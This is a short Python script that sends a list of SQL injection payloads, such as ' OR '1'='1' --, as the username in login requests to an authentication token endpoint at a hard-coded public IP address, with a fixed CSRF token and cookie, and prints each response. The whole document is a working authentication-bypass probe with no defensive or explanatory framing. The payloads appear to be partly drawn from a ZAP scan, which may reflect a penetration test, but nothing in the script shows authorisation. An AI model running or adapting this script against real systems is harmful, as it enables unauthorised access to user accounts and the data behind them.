import requests

url = "http://52.234.148.8/auth/api/token/"
csrf_token = "fkk4gyxyMfG3w8zdYpS5N6j5XBwdBYff"  # Replace if needed
cookie = f"csrftoken={csrf_token}"

headers = {
    "Content-Type": "application/json",
    "X-CSRFToken": csrf_token,
    "Cookie": cookie,
}

payloads = [
    'ZAP" AND "1"="1" -- ',
    'ZAP" AND "1"="2" -- ',
    "' OR '1'='1' -- ",
    "' OR '1'='2' -- ",
    "' OR 1=1 -- ",
    "' OR 1=2 -- ",
    "' OR 'a'='a' -- ",
    "' OR 'a'='b' -- ",
]

password = "anything"

for payload in payloads:
    data = {
        "username": payload,
        "password": password
    }
    print(f"Testing payload: {payload}")
    response = requests.post(url, json=data, headers=headers)
    try:
        print("Status code:", response.status_code)
        print("Response:", response.json())
    except Exception as e:
        print("Non-JSON response:", response.text)
    print("-" * 50)
